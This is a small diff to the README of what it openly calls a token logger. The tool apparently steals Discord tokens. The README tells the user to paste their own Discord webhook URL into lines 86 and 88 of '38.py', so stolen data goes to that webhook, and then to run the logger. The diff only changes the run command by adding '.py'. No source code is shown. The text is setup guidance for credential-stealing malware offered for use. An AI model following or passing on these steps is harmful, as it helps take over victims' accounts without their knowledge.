@@ -40,4 +40,4 @@ In the file "38.py" go to line 86 and replace the text with your discord webhook
 In the file "38.py" go to line 88 and replace the text with your discord webhook url.
 
 # How to Run
-Execute the token logger by double clicking it or doing "python [file name]"
+Execute the token logger by double clicking it or doing "python [file name].py"
